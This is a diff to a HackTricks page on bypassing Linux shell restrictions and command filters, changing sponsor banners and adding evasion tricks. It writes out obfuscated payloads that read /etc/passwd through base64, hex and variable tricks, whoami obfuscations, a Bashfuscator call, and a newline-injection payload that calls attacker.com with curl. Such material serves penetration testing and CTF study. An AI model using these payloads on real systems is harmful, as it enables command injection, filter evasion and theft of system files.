@@ -2,27 +2,23 @@
 
 <details>
 
-<summary><strong>Support HackTricks and get benefits!</strong></summary>
+<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-{% hint style="danger" %}
-<img src="../../.gitbook/assets/image (307).png" alt="" data-size="original">
+![](<../.gitbook/assets/image (9) (1) (2).png>)
 
-Through Security Skills as a Service, we help organizations to **defend against the Dark Hacking Arts**. Security Skills as a Service is an offensive cybersecurity consultancy model that combines an Intelligent Platform with the top-class, globally distributed, offensive security engineers, delivering **high-quality penetration testing results. Security Hubs** bring together offensive penetration testing tactics with human behavioral science, providing real-time insights into threat actors' tradecraft and a **complete assessment of any risks**.
+\
+Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
-{% embed url="https://securityhubs.io/" %}
-{% endhint %}
+{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## Common Limitations Bypasses
 
@@ -57,18 +53,31 @@ nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost
 # Wildcard + local directory arguments
 touch -- -la # -- stops processing options after the --
 ls *
+echo * #List current files and folders with echo and wildcard
 
 # [chars]
 /usr/bin/n[c] # /usr/bin/nc
 
-# Quotes / Concatenation
+# Quotes
 'p'i'n'g # ping
 "w"h"o"a"m"i # whoami
-\u\n\a\m\e \-\a # uname -a
 ech''o test # echo test
 ech""o test # echo test
 bas''e64 # base64
+
+#Backslashes
+\u\n\a\m\e \-\a # uname -a
 /\b\i\n/////s\h
+
+# $@
+who$@ami #whoami
+
+# Transformations (case, reverse, base64)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
+$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
+$(rev<<<'imaohw') #whoami
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
+
 
 # Execution through $0
 echo whoami|$0
@@ -109,6 +118,9 @@ echo${IFS}test
 # Using hex format
 X=$'cat\x20/etc/passwd'&&$X
 
+# Using tabs
+echo "ls\x09-l" | bash
+
 # New lines
 p\
 i\
@@ -125,6 +137,12 @@ uname!-1\-a # This equals to uname -a
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+```
+
+### Bypass pipes
+
+```bash
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
 ### Bypass with hex encoding
@@ -150,6 +168,13 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+```
+
+### Getting chars from Env Variables
+
+```bash
+echo ${LS_COLORS:10:1} #;
+echo ${PATH:0:1} #/
 ```
 
 ### DNS data exfiltration
@@ -192,6 +217,9 @@ declare historywords
 source f*
 flag.txt:1: command not found: CTF{asdasdasd}
 
+# Read file with read
+while read -r line; do echo $line; done < /etc/passwd
+
 # Get env variables
 declare
 
@@ -211,8 +239,15 @@ declare historywords
 ### Bypass potential regexes
 
 ```bash
-# A regex that only allow letters and numbers migth be vulnerable to new line characters
+# A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
+```
+
+### Bashfuscator
+
+```bash
+# From https://github.com/Bashfuscator/Bashfuscator
+./bashfuscator -c 'cat /etc/passwd'
 ```
 
 ### RCE with 5 chars
@@ -316,26 +351,22 @@ If you are inside a filesystem with the **read-only and noexec protections** the
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-{% hint style="danger" %}
-<img src="../../.gitbook/assets/image (307).png" alt="" data-size="original">
+![](<../.gitbook/assets/image (9) (1) (2).png>)
 
-Through Security Skills as a Service, we help organizations to **defend against the Dark Hacking Arts**. Security Skills as a Service is an offensive cybersecurity consultancy model that combines an Intelligent Platform with the top-class, globally distributed, offensive security engineers, delivering **high-quality penetration testing results. Security Hubs** bring together offensive penetration testing tactics with human behavioral science, providing real-time insights into threat actors' tradecraft and a **complete assessment of any risks**.
+\
+Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
-{% embed url="https://securityhubs.io/" %}
-{% endhint %}
+{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>Support HackTricks and get benefits!</strong></summary>
+<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-
-**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
+* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
